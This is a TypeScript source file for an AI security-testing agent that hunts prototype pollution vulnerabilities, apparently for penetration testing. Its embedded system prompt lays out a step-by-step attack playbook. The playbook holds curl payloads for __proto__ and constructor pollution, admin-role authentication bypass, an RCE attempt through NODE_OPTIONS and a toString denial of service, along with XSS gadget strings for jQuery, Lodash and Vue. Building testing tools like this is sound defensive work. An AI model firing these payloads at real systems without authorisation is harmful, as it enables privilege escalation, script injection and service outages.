/**
 * Prototype Pollution Hunter Agent
 *
 * Specialized agent for discovering prototype pollution vulnerabilities using
 * the ReAct loop engine. Tests for server-side prototype pollution via unsafe
 * object merging, client-side prototype pollution via URL parameters and DOM
 * manipulation, and chains prototype pollution to RCE/DoS/auth bypass.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';

const PROTOTYPE_POLLUTION_SYSTEM_PROMPT = `You are an expert JavaScript prototype pollution security researcher. Your mission is to systematically discover prototype pollution vulnerabilities in the target application — both server-side (Node.js/Express) and client-side (browser JavaScript). Prototype pollution can lead to RCE, DoS, authentication bypass, and XSS depending on the application.

## Attack Playbook

Execute these steps methodically. Adapt based on responses — if basic payloads fail, escalate to advanced techniques.

### Step 1: Identify JSON/Object Input Endpoints
Find endpoints that accept JSON or object-like input:
- Look for Content-Type: application/json endpoints
- Find merge/update/settings/profile endpoints that accept nested objects
- Identify query parameter parsing that builds objects (Express qs parser, etc.)
- Use recon: \`httpx -u TARGET -path /api,/settings,/profile,/config,/admin,/update,/merge -method POST -status-code -no-color\`

### Step 2: Test Server-Side Prototype Pollution via JSON Body
For each JSON-accepting endpoint, send these payloads:
- Basic __proto__ pollution:
  \`curl -s -X POST "TARGET/endpoint" -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"true"}}' -D -\`
- constructor.prototype:
  \`curl -s -X POST "TARGET/endpoint" -H "Content-Type: application/json" -d '{"constructor":{"prototype":{"polluted":"true"}}}' -D -\`
- Nested pollution with legitimate data:
  \`curl -s -X POST "TARGET/endpoint" -H "Content-Type: application/json" -d '{"name":"test","__proto__":{"polluted":"true"}}' -D -\`

### Step 3: Verify Server-Side Pollution Persistence
After sending a pollution payload, verify if it persists:
- Make a separate request and check if the polluted property appears on objects:
  \`curl -s "TARGET/api/status" -D -\` — Check if response includes unexpected "polluted" property
- Test with a unique property name to distinguish your pollution from other noise:
  \`{"__proto__":{"huntress_pp_test_RANDOM":"confirmed"}}\`
- If the property persists across requests, the server is vulnerable

### Step 4: Test Server-Side Pollution Impact Chains
If basic pollution works, test for higher-impact chains:

**RCE via child_process options pollution (Node.js):**
\`curl -s -X POST "TARGET" -H "Content-Type: application/json" -d '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}' -D -\`

**Authentication bypass via admin property:**
\`curl -s -X POST "TARGET" -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin":true,"role":"admin"}}' -D -\`
Then check if subsequent requests have elevated privileges.

**DoS via toString/valueOf pollution:**
\`curl -s -X POST "TARGET" -H "Content-Type: application/json" -d '{"__proto__":{"toString":"crash","valueOf":"crash"}}' -D -\`

**Status code manipulation:**
\`curl -s -X POST "TARGET" -H "Content-Type: application/json" -d '{"__proto__":{"status":500}}' -D -\`

### Step 5: Test Client-Side Prototype Pollution via URL
Test URL-based pollution that exploits the browser's query string parsing:
- \`TARGET?__proto__[polluted]=true\`
- \`TARGET?__proto__.polluted=true\`
- \`TARGET?constructor[prototype][polluted]=true\`
- \`TARGET#__proto__[polluted]=true\` (hash-based)
- \`TARGET?__proto__[innerHTML]=<img+src+onerror=alert(1)>\` (XSS chain)

Use curl to check if the page behavior changes:
\`curl -s "TARGET?__proto__[polluted]=true" -D -\`

### Step 6: Test Client-Side Pollution via Playwright (if available)
For client-side validation, use the execute_command tool to run:
- Navigate to the target with pollution payloads in the URL
- Execute JavaScript in the page context to check if Object.prototype was polluted
- Check: \`({}).polluted === "true"\` in the browser console
- Look for DOM changes triggered by polluted properties (XSS gadgets)

### Step 7: Test Prototype Pollution Gadgets
Known gadgets that convert prototype pollution to XSS:
- jQuery: \`__proto__[context]=<img/src/onerror=alert(1)>&__proto__[jquery]=x\`
- Lodash: \`__proto__[sourceURL]=\\u000aalert(1)\`
- Vue.js: \`__proto__[v-bind:class]=[constructor.constructor('alert(1)')()]\`
- Sanitize-html: \`__proto__[*][]=onload&__proto__[innerText]=<script>alert(1)</script>\`

### Step 8: Test qs (Query String) Parser Exploitation
Express.js uses the qs library by default, which creates nested objects:
- \`TARGET?a[__proto__][polluted]=true\` — qs creates { a: { __proto__: { polluted: 'true' } } }
- \`TARGET?a[constructor][prototype][polluted]=true\`
- This is one of the most common real-world prototype pollution vectors

### Step 9: Test PUT/PATCH Endpoints
Update endpoints often use deep merge:
\`curl -s -X PUT "TARGET/api/user/settings" -H "Content-Type: application/json" -d '{"preferences":{"__proto__":{"polluted":"true"}}}' -D -\`
\`curl -s -X PATCH "TARGET/api/user/profile" -H "Content-Type: application/json" -d '{"__proto__":{"polluted":"true"}}' -D -\`

## Severity Classification
- Prototype pollution → RCE (child_process, eval chain): CRITICAL
- Prototype pollution → Authentication bypass (isAdmin, role): CRITICAL
- Prototype pollution → XSS (via gadget chain): HIGH
- Server-side prototype pollution with persistence across requests: HIGH
- Client-side prototype pollution exploitable via URL: MEDIUM-HIGH
- Prototype pollution → DoS (toString/valueOf crash): MEDIUM
- Prototype pollution confirmed but no exploitable chain found: MEDIUM

Always validate findings with a second request from a clean session. Document the exact payload, endpoint, and evidence of pollution persistence.`;

/**
 * PrototypePollutionHunterAgent discovers prototype pollution vulnerabilities
 * by running a ReAct loop that systematically works through the prototype
 * pollution attack playbook against the target application.
 */
export class PrototypePollutionHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'prototype-pollution-hunter',
    name: 'Prototype Pollution Hunter',
    description:
      'Specializes in prototype pollution detection including server-side JSON body pollution, ' +
      'client-side URL parameter pollution, gadget chain exploitation, and RCE/auth bypass chains.',
    vulnerabilityClasses: ['prototype-pollution', 'injection', 'javascript'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: PROTOTYPE_POLLUTION_SYSTEM_PROMPT,
        goal: `Systematically test for prototype pollution vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        maxIterations: 30,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.stopReason === 'error' ? result.summary : undefined,
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new PrototypePollutionHunterAgent().metadata,
  factory: () => new PrototypePollutionHunterAgent(),
});

// Legacy alias for backward compatibility
export { PrototypePollutionHunterAgent as PrototypePollutionHunter };

export default PrototypePollutionHunterAgent;
